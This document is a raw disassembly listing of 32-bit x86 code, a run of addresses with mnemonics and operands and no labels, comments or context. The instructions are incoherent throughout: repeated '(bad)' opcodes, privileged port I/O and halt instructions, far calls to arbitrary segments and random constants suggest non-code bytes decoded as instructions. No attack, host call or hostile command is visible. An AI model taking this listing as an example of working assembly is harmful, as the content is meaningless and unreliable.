  41bbca:	xchg   edx,eax
  41bbcc:	sbb    al,0xdc
  41bbce:	loop   0x41bb9d
  41bbd0:	adc    BYTE PTR [ebp+0x7f6ebe2a],al
  41bbd6:	out    0x12,al
  41bbd8:	pushf  
  41bbd9:	mov    ds:0x8a874ccb,eax
  41bbde:	or     BYTE PTR [eax],ah
  41bbe0:	adc    edx,esp
  41bbe2:	stos   DWORD PTR es:[edi],eax
  41bbe3:	cmp    WORD PTR [edi],cx
  41bbe6:	adc    BYTE PTR [ecx],bl
  41bbe8:	inc    ebp
  41bbe9:	and    al,0x5c
  41bbeb:	pop    ecx
  41bbec:	xchg   ecx,eax
  41bbed:	enter  0xc015,0x29
  41bbf1:	jle    0x41bba7
  41bbf3:	sbb    ch,BYTE PTR [esi+ecx*1]
  41bbf6:	outs   dx,BYTE PTR ds:[esi]
  41bbf7:	popf   
  41bbf8:	push   eax
  41bbf9:	xlat   BYTE PTR ds:[ebx]
  41bbfa:	rcr    DWORD PTR [edi],1
  41bbfc:	rol    BYTE PTR [eax+0xf0793c7],cl
  41bc02:	lea    esi,[esi+0x6b]
  41bc05:	and    ah,BYTE PTR [esi+ebx*8]
  41bc08:	lods   al,BYTE PTR ds:[esi]
  41bc09:	dec    esp
  41bc0a:	and    eax,0x7c8ae99f
  41bc0f:	data16 mov ch,0x39
  41bc12:	inc    edx
  41bc13:	ja     0x41bc19
  41bc15:	cmp    al,0x14
  41bc17:	mov    al,ds:0xb8dab53e
  41bc1c:	push   cs
  41bc1d:	jl     0x41bc53
  41bc1f:	ins    DWORD PTR es:[edi],dx
  41bc20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc21:	(bad)  
  41bc22:	fmul   st,st(1)
  41bc24:	in     al,dx
  41bc25:	push   ecx
  41bc26:	sub    cl,cl
  41bc28:	int3   
  41bc29:	test   eax,0xfc22f79e
  41bc2e:	clc    
  41bc2f:	ins    DWORD PTR es:[edi],dx
  41bc30:	popf   
  41bc31:	aad    0x53
  41bc33:	shl    BYTE PTR [eax],cl
  41bc35:	hlt    
  41bc36:	push   esp
  41bc37:	outs   dx,DWORD PTR ds:[esi]
  41bc38:	and    eax,ebp
  41bc3a:	pop    eax
  41bc3b:	and    esp,DWORD PTR [ebx]
  41bc3d:	push   edi
  41bc3e:	inc    esi
  41bc3f:	mov    al,0xc1
  41bc41:	mov    BYTE PTR [esi-0x7b],cl
  41bc44:	push   0x27
  41bc46:	mov    dh,0xb7
  41bc48:	xor    ecx,esi
  41bc4a:	je     0x41bcbe
  41bc4c:	(bad)  
  41bc4d:	fnstcw WORD PTR [edi]
  41bc4f:	jp     0x41bc34
  41bc51:	fdivrp st(6),st
  41bc53:	out    0xdd,eax
  41bc55:	lds    ecx,FWORD PTR ds:0xafc4ec00
  41bc5b:	in     al,dx
  41bc5c:	imul   edi,DWORD PTR [eax+0x317a68e6],0x14
  41bc63:	pop    ebx
  41bc64:	push   es
  41bc65:	fs pop ds
  41bc67:	sbb    dl,BYTE PTR [esi]
  41bc69:	scas   al,BYTE PTR es:[edi]
  41bc6a:	rcl    DWORD PTR [edi+0x18],cl
  41bc6d:	cmc    
  41bc6e:	addr16 pop sp
  41bc71:	call   DWORD PTR [ebp-0x4d7fd0e8]
  41bc77:	mov    edi,0x17fb5be9
  41bc7c:	fnsave [eax+0x3950d074]
  41bc82:	nop
  41bc83:	data16 mov ah,0x81
  41bc86:	addr16 mov esi,0x250c8087
  41bc8c:	mov    WORD PTR [edx+0x1759e950],?
  41bc92:	pop    ss
  41bc93:	lock sbb BYTE PTR [ebx],cl
  41bc96:	cli    
  41bc97:	bswap  esp
  41bc99:	stos   DWORD PTR es:[edi],eax
  41bc9a:	jl     0x41bce7
  41bc9c:	inc    edx
  41bc9d:	fdiv   QWORD PTR [ebx]
  41bc9f:	leave  
  41bca0:	sar    BYTE PTR [esi],cl
  41bca2:	loop   0x41bd18
  41bca4:	or     dl,0x74
  41bca7:	add    ch,BYTE PTR [edi+0x7b]
  41bcaa:	sub    al,BYTE PTR [edx]
  41bcac:	outs   dx,BYTE PTR ds:[esi]
  41bcad:	stos   DWORD PTR es:[edi],eax
  41bcae:	ror    dl,cl
  41bcb0:	push   ds
  41bcb1:	add    esi,DWORD PTR [edi-0x4d]
  41bcb4:	sahf   
  41bcb5:	in     al,0x4
  41bcb7:	and    dl,0x4a
  41bcba:	repz loope 0x41bd14
  41bcbd:	push   cs
  41bcbe:	mov    ah,0x17
  41bcc0:	inc    edi
  41bcc1:	and    al,0x89
  41bcc3:	adc    edx,ebp
  41bcc5:	nop
  41bcc6:	loope  0x41bc7f
  41bcc8:	add    eax,0xf90fc16f
  41bccd:	inc    eax
  41bcce:	and    al,0xc6
  41bcd0:	and    eax,0x4f937681
  41bcd5:	sub    al,0x7c
  41bcd7:	add    dl,ch
  41bcd9:	loope  0x41bd3a
  41bcdb:	das    
  41bcdc:	ins    BYTE PTR es:[edi],dx
  41bcdd:	add    bh,BYTE PTR [esi+0x6b712ad9]
  41bce3:	adc    al,BYTE PTR [eax-0x5c3877bc]
  41bce9:	or     eax,0x2ad115ae
  41bcee:	lahf   
  41bcef:	cwde   
  41bcf0:	sbb    al,0x5
  41bcf2:	nop
  41bcf3:	adc    esp,eax
  41bcf5:	mov    cl,BYTE PTR [edx-0x1d]
  41bcf8:	ja     0x41bc8d
  41bcfa:	in     eax,0x32
  41bcfc:	or     DWORD PTR [eax-0x64],edx
  41bcff:	sub    ch,BYTE PTR [ebx+0x3b]
  41bd02:	out    dx,al
  41bd03:	(bad)  
  41bd04:	aaa    
  41bd05:	into   
  41bd06:	aaa    
  41bd07:	bound  edi,QWORD PTR [ebx+0x25]
  41bd0a:	and    esp,DWORD PTR [ecx-0x70d97ab1]
  41bd10:	xchg   esi,ebp
  41bd12:	xor    eax,0xf94af573
  41bd17:	pop    eax
  41bd18:	dec    esi
  41bd19:	test   al,0x1d
  41bd1b:	into   
  41bd1c:	(bad)  
  41bd1d:	std    
  41bd1e:	cmp    BYTE PTR [esi],dl
  41bd20:	icebp  
  41bd21:	mov    ebp,0x91a653eb
  41bd26:	inc    esi
  41bd27:	mov    cl,0x2a
  41bd29:	jne    0x41bcb3
  41bd2b:	push   esp
  41bd2c:	sti    
  41bd2d:	aam    0x47
  41bd2f:	dec    esp
  41bd30:	mov    eax,0x5ed78c81
  41bd35:	xlat   BYTE PTR ds:[ebx]
  41bd36:	repz dec eax
  41bd38:	dec    esi
  41bd39:	inc    ebp
  41bd3a:	and    eax,0x89916596
  41bd3f:	adc    esp,DWORD PTR [ebx+0x7dcbb4db]
  41bd45:	sti    
  41bd46:	push   eax
  41bd47:	xor    BYTE PTR [ebp+0x649ef608],al
  41bd4d:	push   ds
  41bd4e:	pushf  
  41bd4f:	jmp    0x4257:0x88d382ec
  41bd56:	sub    BYTE PTR [ebp-0x766632a3],dl
  41bd5c:	add    edx,DWORD PTR [edx+0xed5095d]
  41bd62:	xlat   BYTE PTR ds:[ebx]
  41bd63:	push   esi
  41bd64:	or     eax,0xc7df13dc
  41bd69:	pop    edx
  41bd6a:	pusha  
  41bd6b:	(bad)  
  41bd6c:	pop    eax
  41bd6d:	push   0x4
  41bd6f:	ins    BYTE PTR es:[edi],dx
  41bd70:	cmp    dh,BYTE PTR [edi+0x7b7745cc]
  41bd76:	ret    0xd67
  41bd79:	lods   eax,DWORD PTR ds:[esi]
  41bd7a:	outs   dx,DWORD PTR ds:[esi]
  41bd7b:	repnz in al,dx
  41bd7d:	or     bl,BYTE PTR [edi+esi*2]
  41bd80:	sub    DWORD PTR [edx+0x73823986],esp
  41bd86:	add    bh,BYTE PTR ds:0xe5f6397b
  41bd8c:	lods   al,BYTE PTR ds:[esi]
  41bd8d:	mov    dh,0xdc
  41bd8f:	mov    ebx,0x661da69c
  41bd94:	sub    al,0x56
  41bd96:	bsf    ebx,DWORD PTR ds:0xcbc41c28
  41bd9d:	clc    
  41bd9e:	or     eax,0x8b860d25
  41bda3:	fwait
  41bda4:	div    ebp
  41bda6:	inc    ecx
  41bda7:	mov    DWORD PTR [ebx+0x39],edi
  41bdaa:	pusha  
  41bdab:	sbb    ah,ch
  41bdad:	xchg   ebp,eax
  41bdae:	jl     0x41bdb1
  41bdb0:	push   ds
  41bdb1:	or     DWORD PTR [ebx-0x590fb1aa],0xb24f755f
  41bdbb:	cmc    
  41bdbc:	les    esp,FWORD PTR [esi-0x6e7302ee]
  41bdc2:	in     al,0xdb
  41bdc4:	ja     0x41bde1
  41bdc6:	out    0x66,eax
  41bdc8:	pop    eax
  41bdc9:	out    0x64,al
  41bdcb:	or     ah,BYTE PTR [ebp+eiz*1+0x24457033]
  41bdd2:	out    0x2a,eax
  41bdd4:	popf   
  41bdd5:	pushf  
  41bdd6:	adc    al,0x94
  41bdd8:	shl    DWORD PTR [ecx-0x47],cl
  41bddb:	mov    ecx,0xd676637a
  41bde0:	pushf  
  41bde1:	sbb    al,0x46
  41bde3:	mov    bh,0xeb
  41bde5:	dec    edx
  41bde6:	call   0x7ada:0x92b796d9
  41bded:	in     al,0x5e
  41bdef:	mov    cl,0xde
  41bdf1:	sub    ecx,DWORD PTR [ecx-0x2e27d111]
  41bdf7:	in     al,0xe2
  41bdf9:	clc    
  41bdfa:	fwait
  41bdfb:	mov    dh,0x69
  41bdfd:	push   esi
  41bdfe:	cli    
  41bdff:	adc    al,0xe0
  41be01:	pop    es
  41be02:	jmp    0x41bda7
  41be04:	fisub  DWORD PTR [ebp+0x62]
  41be07:	aam    0x6a
  41be09:	in     al,dx
  41be0a:	inc    ebp
  41be0b:	jne    0x41bde1
  41be0d:	in     eax,0x98
  41be0f:	push   ebp
  41be10:	inc    ecx
  41be11:	fcomp  DWORD PTR [ebp+0x4fac6f30]
  41be17:	pusha  
  41be18:	cwde   
  41be19:	and    BYTE PTR [eax+0x6b21ce8f],ah
  41be1f:	add    eax,0xd04f0da0
  41be24:	push   es
  41be25:	dec    esp
  41be26:	loop   0x41bdf2
  41be28:	retf   0x25e5
  41be2b:	(bad)  
  41be2c:	(bad)  
  41be2e:	arpl   bp,bx
  41be30:	por    mm5,QWORD PTR [edi+0x10]
  41be34:	sbb    eax,0xb7501fd5
  41be39:	dec    ebx
  41be3a:	jnp    0x41be72
  41be3c:	stos   BYTE PTR es:[edi],al
  41be3d:	(bad)  
  41be3f:	add    BYTE PTR [esi-0x22dc8357],dh
  41be45:	add    edx,DWORD PTR [esi+0x14cc320]
  41be4b:	mov    dl,0xde
  41be4d:	(bad)  
  41be4e:	fwait
  41be4f:	adc    eax,0x881b1668
  41be54:	inc    esp
  41be55:	fdivr  QWORD PTR [eax+0x69]
  41be58:	fiadd  WORD PTR [edx]
  41be5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be5b:	xor    cl,BYTE PTR [ebx]
  41be5d:	push   cs
  41be5e:	xor    ebp,DWORD PTR [ebx+0x31b6b146]
  41be64:	aam    0x3c
  41be66:	xlat   BYTE PTR ds:[ebx]
  41be67:	mov    ah,0x86
  41be69:	add    al,0x5b
  41be6b:	jg     0x41be0a
  41be6d:	mov    bl,cl
  41be6f:	dec    esp
  41be70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be71:	mov    ecx,0x736f83b5
  41be76:	int    0x78
  41be78:	arpl   WORD PTR [ecx],sp
  41be7a:	lods   al,BYTE PTR ds:[esi]
  41be7b:	nop
  41be7c:	xor    eax,0x96d7ec7
  41be81:	pop    ebx
  41be82:	pusha  
  41be83:	xor    BYTE PTR [ebp-0x2de8ddd7],dh
  41be89:	xchg   edi,eax
  41be8a:	mov    ebx,0xf9d23de8
  41be8f:	adc    DWORD PTR ds:0x70ee58d9,ebx
  41be95:	in     al,0xcd
  41be97:	sub    eax,0x60f726bc
  41be9c:	dec    esp
  41be9d:	jnp    0x41be6c
  41be9f:	sbb    BYTE PTR [esi-0x7b6101da],al
  41bea5:	inc    edx
  41bea6:	push   edi
  41bea7:	jae    0x41be29
  41bea9:	fadd   DWORD PTR [edi]
  41beab:	jnp    0x41bea5
  41bead:	(bad)  
  41beae:	sti    
  41beaf:	cmc    
  41beb0:	ret    0x1c03
  41beb3:	lahf   
  41beb4:	test   eax,0xbbf25636
  41beb9:	retf   0xddae
  41bebc:	sub    eax,0xadc281d7
  41bec1:	shr    BYTE PTR [ebx-0x30],1
  41bec4:	hlt    
  41bec5:	stos   BYTE PTR es:[edi],al
  41bec6:	inc    ebx
  41bec7:	sbb    eax,0xa9465206
  41becc:	push   0x3575ddcf
  41bed1:	adc    al,0xf4
  41bed3:	sub    dh,ah
  41bed5:	lods   al,BYTE PTR ds:[esi]
  41bed6:	test   al,0x14
  41bed8:	dec    edi
  41bed9:	popf   
  41beda:	in     eax,dx
  41bedb:	or     esp,DWORD PTR [edx-0x22]
  41bede:	inc    ebp
  41bedf:	or     al,0xa3
  41bee1:	pop    edi
  41bee2:	rcl    esp,0x6c
  41bee5:	or     eax,0xb2099040
  41beea:	sbb    eax,0x452e4ac4
  41beef:	test   al,0x5a
  41bef1:	mov    al,ds:0x58030688
  41bef6:	cdq    
  41bef7:	pop    es
  41bef8:	loope  0x41bede
  41befa:	sbb    DWORD PTR [esi],eax
  41befc:	xor    ecx,esi
  41befe:	add    dl,BYTE PTR ds:0x44ac4751
  41bf04:	jbe    0x41bf1c
  41bf06:	push   edi
  41bf07:	dec    edx
  41bf08:	cmp    BYTE PTR ss:[ebp+0x34327106],bl
  41bf0f:	lock mov BYTE PTR [ebp-0x76a96a04],dl
  41bf16:	jnp    0x41bf0e
  41bf18:	add    ch,al
  41bf1a:	hlt    
  41bf1b:	or     DWORD PTR [eax-0x2c7c4b1e],ebp
  41bf21:	dec    ebp
  41bf22:	or     BYTE PTR [eax],ch
  41bf24:	cmp    BYTE PTR [ecx],ch
  41bf26:	mov    cl,BYTE PTR ds:0x8b4dd5da
  41bf2c:	fstp   QWORD PTR [edi+0x4a]
  41bf2f:	cmp    eax,edi
  41bf31:	rcl    DWORD PTR [ebx+eiz*4-0xf],cl
  41bf35:	xchg   BYTE PTR [eax+0x6c],al
  41bf38:	mov    al,ds:0x1bf399e2
  41bf3d:	inc    esi
  41bf3e:	into   
  41bf3f:	outs   dx,DWORD PTR ds:[esi]
  41bf40:	fsubr  DWORD PTR [edi-0x45b104d0]
  41bf46:	ret    0x7263
  41bf49:	loope  0x41bf4b
  41bf4b:	adc    al,al
  41bf4d:	mov    al,0xf1
  41bf4f:	outs   dx,DWORD PTR ds:[esi]
  41bf50:	dec    esp
  41bf51:	pop    edx
  41bf52:	retf   0x19fb
  41bf55:	dec    edx
  41bf56:	mov    ecx,0x79b8ae4e
  41bf5b:	stc    
  41bf5c:	fcmovnbe st,st(4)
  41bf5e:	inc    edx
  41bf5f:	jbe    0x41bf0b
  41bf61:	pop    edi
  41bf62:	cmp    ebp,eax
  41bf64:	push   ds
  41bf65:	xor    eax,0x1394209f
  41bf6a:	push   eax
  41bf6b:	xchg   ebp,eax
  41bf6c:	into   
  41bf6d:	or     al,0x63
  41bf6f:	hlt    
  41bf70:	nop
  41bf71:	(bad)  
  41bf72:	mov    ds:0x96228f05,al
  41bf77:	dec    BYTE PTR [ebp-0x5a]
  41bf7a:	inc    esi
  41bf7b:	pop    DWORD PTR [eax-0x5b]
  41bf7e:	pop    ebp
  41bf7f:	hlt    
  41bf80:	dec    ebp
  41bf81:	adc    dh,al
  41bf83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf84:	adc    dl,al
  41bf86:	sub    DWORD PTR [esi],edx
  41bf88:	rcl    DWORD PTR [esi],0xda
  41bf8b:	mov    WORD PTR [eax],ds
  41bf8d:	and    esi,DWORD PTR [edi]
  41bf8f:	mov    ds:0x388cb3ce,eax
  41bf94:	mov    ebp,0x3f2f8f49
  41bf99:	pop    es
  41bf9a:	mov    dl,0x49
  41bf9c:	dec    ecx
  41bf9d:	mov    ?,WORD PTR [ecx]
  41bf9f:	int    0xad
  41bfa1:	add    bh,bl
  41bfa3:	sti    
  41bfa4:	enter  0xcc14,0xc8
  41bfa8:	dec    ebx
  41bfa9:	out    0xd7,eax
  41bfab:	fldln2 
  41bfad:	mov    al,ds:0x77f52e22
  41bfb2:	mov    WORD PTR ds:0x2e77c7f2,ss
  41bfb8:	dec    esi
  41bfb9:	cli    
  41bfba:	push   ss
  41bfbb:	nop
  41bfbc:	xor    esi,DWORD PTR [ecx-0x32]
  41bfbf:	aaa    
  41bfc0:	in     eax,0x1
  41bfc2:	lock cld 
  41bfc4:	mov    edi,0x19b9be1f
  41bfc9:	cmp    dh,dh
  41bfcb:	adc    eax,ebp
  41bfcd:	xchg   edx,eax
  41bfce:	imul   ebp,edi,0xdcb9f624
  41bfd4:	sbb    eax,DWORD PTR [ebx+0x3c]
  41bfd7:	pusha  
  41bfd8:	jb     0x41bfda
  41bfda:	mov    bl,0xb2
  41bfdc:	dec    ebx
  41bfdd:	and    al,0xf1
  41bfdf:	pop    esi
  41bfe0:	pop    ds
  41bfe1:	mov    esi,0x2a517f8a
  41bfe6:	lahf   
  41bfe7:	mov    edx,0xf4944f3e
  41bfec:	in     eax,0x24
  41bfee:	fisubr DWORD PTR [ebx-0x38144276]
  41bff4:	hlt    
  41bff5:	lds    ebp,FWORD PTR [edx]
  41bff7:	lea    edx,[esi+0x3ec7bcb1]
  41bffd:	les    edx,FWORD PTR [ebx-0x5a14ef34]
  41c003:	imul   eax,DWORD PTR [ebx-0x6a],0x71
  41c007:	push   0x7c
  41c009:	je     0x41c08a
  41c00b:	mov    edx,0x4e4df7d1
  41c010:	pop    es
  41c011:	mov    al,0x4c
  41c013:	int3   
  41c014:	inc    esi
  41c015:	sbb    eax,0xa4d1667b
  41c01a:	jle    0x41bfb3
  41c01c:	mov    ebx,esi
  41c01e:	ja     0x41c093
  41c020:	jle    0x41bff3
  41c022:	ud1    esi,DWORD PTR [eax-0x51411fd3]
  41c029:	cmc    
  41c02a:	mov    WORD PTR [ebp+0x2e],fs
  41c02d:	adc    dh,BYTE PTR [edi-0x419a9ea3]
  41c033:	push   0x6a
  41c035:	and    al,BYTE PTR [edi]
  41c037:	mov    ch,0x22
  41c039:	test   DWORD PTR [ecx+ecx*8],edx
  41c03c:	add    eax,0xb1730cb3
  41c041:	jl     0x41c073
  41c043:	mov    eax,ds:0x2eb179a8
  41c048:	jge    0x41c07f
  41c04a:	loopne 0x41c087
  41c04c:	cmc    
  41c04d:	or     al,BYTE PTR [edi+eax*8+0x9]
  41c051:	jge    0x41c088
  41c053:	mov    ah,0x67
  41c055:	call   0xfb39:0xac6440f5
  41c05c:	icebp  
  41c05d:	sub    eax,0xa34aeb87
  41c062:	sub    BYTE PTR [eax],ah
  41c064:	mov    bh,0x9d
  41c066:	xchg   esi,eax
  41c067:	in     al,dx
  41c068:	loope  0x41bffd
  41c06a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c06b:	lahf   
  41c06c:	xor    bl,dl
  41c06e:	mov    eax,0xba07ec7d
  41c073:	xor    edx,edi
  41c075:	push   ebx
  41c076:	inc    ebp
  41c077:	pop    eax
  41c078:	mov    al,ds:0xe328a773
  41c07e:	adc    al,0x61
  41c080:	fwait
  41c081:	xchg   esp,eax
  41c082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c083:	or     BYTE PTR ds:0xa13dbd2b,dl
  41c089:	push   edx
  41c08a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c08b:	jg     0x41c09c
  41c08d:	jge    0x41c0a8
  41c08f:	jg     0x41c0a9
  41c091:	inc    edx
  41c092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c093:	push   ecx
  41c094:	add    ebp,0x24fce240
  41c09a:	mov    dh,0xc
  41c09c:	xchg   esi,eax
  41c09d:	push   edx
  41c09e:	retf   0x751f
  41c0a1:	xor    eax,0x1e7660ef
  41c0a6:	mov    esi,0xb8940c0b
  41c0ab:	jle    0x41c0e9
  41c0ad:	cmp    esp,DWORD PTR [ecx+edx*2+0x37efe471]
  41c0b4:	loope  0x41c050
  41c0b6:	in     al,dx
  41c0b7:	xchg   ebx,eax
  41c0b8:	xlat   BYTE PTR ds:[ebx]
  41c0b9:	or     ah,bh
  41c0bb:	sub    eax,0x396d9b6f
  41c0c0:	push   esp
  41c0c1:	ret    
  41c0c2:	test   BYTE PTR [edx+0x6e],al
  41c0c5:	cmp    BYTE PTR [ebx+0x25e0a533],dh
  41c0cb:	mov    es,WORD PTR [esi-0xa]
  41c0ce:	xor    ch,bl
  41c0d0:	and    eax,DWORD PTR [eax+0x84715ea]
  41c0d6:	xor    esi,edx
  41c0d8:	in     al,dx
  41c0d9:	push   ss
  41c0da:	mov    al,ds:0x773527e8
  41c0df:	pop    edx
  41c0e0:	sahf   
  41c0e1:	sbb    edx,DWORD PTR [ecx]
  41c0e3:	out    0x7e,al
  41c0e5:	loope  0x41c0bb
  41c0e7:	mov    ah,BYTE PTR [edx+0x7b2999bc]
  41c0ed:	push   fs
  41c0ef:	and    eax,0x8890534c
  41c0f4:	and    DWORD PTR [eax+edi*2-0x2dd77504],ebp
  41c0fb:	sbb    eax,0xe7049749
  41c100:	repz jmp 0x41c126
  41c103:	add    eax,0x2a4c46d3
  41c108:	packuswb mm3,QWORD PTR [esi]
  41c10b:	rcl    edx,1
  41c10d:	pop    eax
  41c10e:	(bad)  
  41c10f:	inc    ebp
  41c110:	je     0x41c17d
  41c112:	and    eax,0xb0b3ad8a
  41c117:	mov    DWORD PTR [edi+0x1b],ebx
  41c11a:	add    al,BYTE PTR [ebx+0x8]
  41c11d:	cmp    esp,DWORD PTR [edi+0x5b]
  41c120:	fwait
  41c121:	push   ss
  41c122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c124:	xor    bl,al
  41c126:	push   eax
  41c127:	push   0x7b
  41c129:	xlat   BYTE PTR ds:[ebx]
  41c12a:	add    al,0x6c
  41c12c:	xchg   DWORD PTR [eax],ebx
  41c12e:	pop    edx
  41c12f:	ja     0x41c107
  41c131:	push   edx
  41c132:	in     al,dx
  41c133:	pop    ecx
  41c134:	(bad)  
  41c135:	xchg   esp,eax
  41c136:	imul   ecx,eax,0x42100b32
  41c13c:	jle    0x41c133
  41c13e:	lods   eax,DWORD PTR ds:[esi]
  41c13f:	sar    DWORD PTR [edx],0x1c
  41c142:	(bad)  
  41c143:	pop    edi
  41c144:	(bad)  
  41c145:	std    
  41c146:	pop    edx
  41c147:	mov    bl,0x72
  41c149:	stos   BYTE PTR es:[edi],al
  41c14a:	mov    ?,WORD PTR [edx+0x67e53cdb]
  41c150:	(bad)  
  41c152:	enter  0x3037,0x44
  41c156:	sbb    BYTE PTR [ebp-0x326526ac],0x6e
  41c15d:	fbld   TBYTE PTR fs:[ecx+0x64]
  41c161:	out    0xa3,al
  41c163:	lds    edi,FWORD PTR [ebx-0xe]
  41c166:	pop    eax
  41c167:	and    esi,DWORD PTR [edi+0x21]
  41c16a:	mov    ah,0xd2
  41c16c:	imul   ebx,DWORD PTR [esp+esi*2-0x7150456f],0x72791ffb
  41c177:	stos   DWORD PTR es:[edi],eax
  41c178:	clc    
  41c179:	out    0xb0,eax
  41c17b:	adc    ch,BYTE PTR [esi+0x5]
  41c17e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c181:	xor    DWORD PTR [edi-0x1b801c04],edi
  41c187:	test   bl,ah
  41c189:	call   0x7d50647c
  41c18e:	stc    
  41c18f:	pop    ds
  41c190:	mov    WORD PTR [ebx+0x621e3cfb],es
  41c196:	into   
  41c197:	adc    edi,DWORD PTR fs:[ebx+0x5d]
  41c19b:	inc    edi
  41c19c:	test   bh,al
  41c19e:	dec    esp
  41c19f:	pop    esi
  41c1a0:	pop    es
  41c1a1:	and    eax,0xe63ef236
  41c1a6:	js     0x41c13d
  41c1a8:	jp     0x41c1b3
  41c1aa:	sbb    eax,0x86e161b
  41c1af:	imul   edx,DWORD PTR [esp+ebp*1+0x4d66a7d4],0xc4e7679e
  41c1ba:	mov    dl,0xaf
  41c1bc:	cs mov ebx,0x3cb65d7c
  41c1c2:	dec    ebp
  41c1c3:	aas    
  41c1c4:	push   cs
  41c1c5:	or     eax,DWORD PTR ss:[eax-0x43596653]
  41c1cc:	xchg   esi,eax
  41c1cd:	into   
  41c1ce:	xchg   ebp,eax
  41c1cf:	mov    dh,0x57
  41c1d1:	data16 sbb BYTE PTR [esi],0x61
  41c1d5:	fcomp  QWORD PTR [esi]
  41c1d7:	punpckhdq mm7,QWORD PTR [ecx-0x2365f40f]
  41c1de:	mov    BYTE PTR [esi+0x57e3f056],bh
  41c1e4:	cmc    
  41c1e5:	ficom  DWORD PTR [edi-0x586b2e9b]
  41c1eb:	retf   0xa3fd
  41c1ee:	fucom  st(3)
  41c1f0:	mov    WORD PTR [edi-0x4e975a8a],ds
  41c1f6:	into   
  41c1f7:	out    0x1,eax
  41c1f9:	add    esi,ebp
  41c1fb:	aad    0xef
  41c1fd:	mov    edi,0x39e98dd5
  41c202:	cmp    eax,0xe24f713f
  41c207:	cwde   
  41c208:	pop    eax
  41c209:	jmp    esp
  41c20b:	rcl    BYTE PTR [edi-0x307d3f9a],1
  41c211:	dec    edi
  41c212:	xor    DWORD PTR [edx-0x5f],esi
  41c215:	inc    eax
  41c216:	dec    ebp
  41c217:	jge    0x41c245
  41c219:	js     0x41c1d6
  41c21b:	mov    ss,WORD PTR [edx+0x64]
  41c21e:	addr16 push eax
  41c220:	gs add al,0x58
  41c223:	bound  ebx,QWORD PTR [eax-0x3]
  41c226:	add    cl,ah
  41c228:	xor    DWORD PTR [esi],ebp
  41c22a:	push   esp
  41c22b:	push   es
  41c22c:	sbb    DWORD PTR [edx-0x4a],0x3b
  41c230:	lahf   
  41c231:	xchg   ebp,eax
  41c232:	mov    WORD PTR [ecx-0x666cb422],?
  41c238:	lods   al,BYTE PTR ds:[esi]
  41c239:	mov    dh,0x3f
  41c23b:	int    0x69
  41c23d:	mov    WORD PTR [esi-0x2],cs
  41c240:	xchg   DWORD PTR ss:[edx+esi*4+0xc],edi
  41c245:	mov    ds:0x2c7b4a7d,al
  41c24a:	mov    DWORD PTR [ebx],edi
  41c24c:	jg     0x41c27b
  41c24e:	and    BYTE PTR [esi+0x5870f345],dh
  41c254:	pop    edi
  41c255:	jne    0x41c1f2
  41c257:	inc    esp
  41c258:	pop    ss
  41c259:	mov    ch,dh
  41c25b:	mov    ah,0x9
  41c25d:	lea    edx,[eax-0x3a]
  41c260:	adc    eax,0x27a8f7a7
  41c265:	mov    ebx,DWORD PTR [ebx+0x31]
  41c268:	call   0xbd90ceee
  41c26d:	add    esp,DWORD PTR ds:0xc3f25b6c
  41c273:	aad    0x90
  41c275:	push   ebp
  41c276:	push   ebx
  41c277:	dec    eax
  41c278:	cmp    al,0xb8
  41c27a:	push   ss
  41c27b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c27c:	lahf   
  41c27d:	std    
  41c27e:	xor    al,0xc
  41c280:	adc    al,BYTE PTR [esi+0x536e1ee4]
  41c286:	add    ecx,DWORD PTR [ebx+edi*4+0x3d]
  41c28a:	inc    eax
  41c28b:	adc    bh,BYTE PTR [edi-0x1e4577ee]
  41c291:	mov    bh,0x47
  41c293:	xchg   ebp,eax
  41c294:	push   ds
  41c295:	lds    eax,FWORD PTR [edx+0x51a9b961]
  41c29b:	rol    dh,cl
  41c29d:	(bad)  
  41c29e:	(bad)  
  41c29f:	ds sub al,0x9a
  41c2a2:	shr    BYTE PTR es:[edi-0x5],cl
  41c2a6:	retf   
  41c2a7:	sar    BYTE PTR [eax+0x17],1
  41c2aa:	push   eax
  41c2ab:	jb     0x41c2ea
  41c2ad:	sub    BYTE PTR [ebx],cl
  41c2af:	mov    BYTE PTR es:[edx-0x4e],bh
  41c2b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2b4:	pushf  
  41c2b5:	xchg   esi,eax
  41c2b6:	pop    ds
  41c2b7:	or     edx,DWORD PTR [ebx-0x4]
  41c2ba:	sahf   
  41c2bb:	dec    eax
  41c2bc:	mov    ecx,0xb8f86fa7
  41c2c1:	shr    DWORD PTR [ebx+0x1dd28fe9],0xbb
  41c2c8:	mov    al,cl
  41c2ca:	sbb    edx,edi
  41c2cc:	mov    bl,0x39
  41c2ce:	aam    0xee
  41c2d0:	shl    BYTE PTR [esi+0x5e74775e],1
  41c2d6:	mov    WORD PTR [esi],es
  41c2d8:	xchg   BYTE PTR [ecx-0x21],bh
  41c2db:	into   
  41c2dc:	ret    
  41c2dd:	pushf  
  41c2de:	repz push edi
  41c2e0:	clc    
  41c2e1:	and    BYTE PTR gs:[edx],ah
  41c2e4:	inc    ebx
  41c2e5:	jl     0x41c2d7
  41c2e7:	and    al,0x87
  41c2e9:	dec    ecx
  41c2ea:	ja     0x41c2b7
  41c2ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2ed:	ss test eax,0x8eabcb95
  41c2f3:	pop    edi
  41c2f4:	call   0xbbf73f49
  41c2f9:	adc    dh,ah
  41c2fb:	mov    ebx,0x9f8c77cd
  41c300:	xchg   ebx,eax
  41c301:	cmp    esp,DWORD PTR [eax+0x70]
  41c304:	pop    ss
  41c305:	add    eax,0x94fc9c42
  41c30a:	dec    edx
  41c30b:	(bad)  
  41c30d:	push   ebp
  41c30e:	xchg   ebx,eax
  41c30f:	add    al,0xee
  41c311:	cmp    esi,DWORD PTR [ebx+edx*4+0x1a]
